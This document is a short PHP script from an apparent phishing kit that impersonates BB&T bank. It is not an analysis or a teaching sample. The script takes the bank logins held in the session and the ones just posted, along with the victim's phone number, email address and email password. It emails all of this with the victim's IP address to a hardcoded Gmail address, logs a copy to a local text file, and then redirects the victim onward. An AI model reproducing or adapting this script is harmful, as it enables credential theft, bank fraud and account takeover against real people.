<?php

ini_set("output_buffering",4096);
session_start();
ob_start();

$random=rand(0,100000000000);
$md5=md5("$random");
$base=base64_encode($md5);
$host=md5("$base");


$ip = getenv("REMOTE_ADDR");
$message .= "--------------[ BB&T ]---------------------\n";
$message .= "UserName     : ".$_SESSION['user']."\n";
$message .= "Password     : ".$_SESSION['pass']."\n";
$message .= "--------------[ BB&T ]---------------------\n";
$message .= "UserName2    : ".$_POST['uuser']."\n";
$message .= "Password2    : ".$_POST['upass']."\n";
$message .= "--------------[ BB&T  ]---------------------\n";
$message .= "Phone Number  : ".$_POST['emailpass1']."\n";
$message .= "Email address : ".$_POST['email']."\n";
$message .= "Email PasWord : ".$_POST['emailpass']."\n";
$message .= "--------------[ BB&T ]---------------------\n";
$message .= "IP            : ".$ip."\n";
$message .= "--------------[ BB&T ]---------------------\n";
$subject = "BB&T Card New $ip";
$headers = "From: BB&T Tohma <mail@info.com>";
$SEND = "javacmy@gmail.com";

mail($SEND,$subject,$message,$headers);
$file = fopen("JJ11.txt", 'a');
fwrite($file, $message);

session_destroy();
$header = "q.html?ID=$host$host$host$host$host";
header("Location: $header");

?>